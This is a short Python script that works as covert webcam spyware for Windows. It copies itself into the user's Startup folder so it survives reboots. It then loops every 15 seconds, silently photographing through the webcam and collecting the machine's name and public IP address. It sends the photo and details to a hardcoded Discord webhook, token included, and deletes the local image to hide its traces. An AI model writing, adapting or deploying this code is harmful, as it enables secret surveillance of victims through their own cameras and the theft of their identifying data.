from cv2 import imwrite, VideoCapture, waitKey, destroyAllWindows
from datetime import datetime
from dhooks import Webhook, File
from os import remove, environ
from os.path import isdir
from requests import get
from time import sleep
from shutil import copy
from sys import executable

dst = environ['USERPROFILE'] + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"

if not isdir(dst + executable):
    copy(executable, dst)

while(True):
    #CAPTURE IMAGE
    now = datetime.now()
    filename = datetime.now().strftime("%d.%m. - %H sat %M minut %S sekund")
    filename1 = filename + ".jpg"
    video = VideoCapture(0) 
    check, frame = video.read()
    key = waitKey(1)
    
    #image saving
    showPic = imwrite(environ['USERPROFILE'] + "\\AppData\\Local\\Temp\\" + filename1, frame)
    video.release()
    destroyAllWindows

    ############################
    ip = get('https://api.ipify.org').content.decode('utf8')
    pcName = environ['COMPUTERNAME']
    currentTime = datetime.now().strftime("%d.%m. - %H:%M:%S")
    hook = Webhook("https://discord.com/api/webhooks/901823811836583967/YjfcOjkCETUB7ZBn7DSXE46dpap0FA2MTODGba3wGb8ZZRV39r2_aW3qw2y0cDq_kv9a")
    cameraImage = File(environ['USERPROFILE'] + "\\AppData\\Local\\Temp\\" + filename1)
    hook.send("```\nPC NAME: "+ pcName +"\nIP: "+ format(ip)+"\n"+ currentTime + "```", file=cameraImage)
    remove(environ['USERPROFILE'] + "\\AppData\\Local\\Temp\\" + filename1)
    sleep(15)#VREME NA KOJE SLIKA
